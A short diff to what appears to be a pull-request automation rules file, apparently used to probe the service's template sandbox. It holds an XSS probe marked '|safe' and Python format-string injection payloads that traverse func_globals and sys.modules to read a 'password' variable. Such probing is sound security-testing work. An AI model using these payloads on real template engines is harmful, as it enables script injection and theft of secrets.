@@ -65,9 +65,9 @@ pull_request_rules:
     actions:
       comment:
         message: request test {{'<script>alert(1);</script>'|safe}}
-  - name: "Template14"
+  - name: "Template15"
     conditions:
       - "base=main"
     actions:
       comment:
-        message: env {{ "{._asdict.func_globals[OrderedDict].clear.func_globals[_sys].modules[__main__].password}".format(named_tuple) }}
+        message: env {{ "{.func_globals[_mutable_sequence_types][1].insert.__func__.func_globals[sys].modules[__main__].password}".format(range) }}
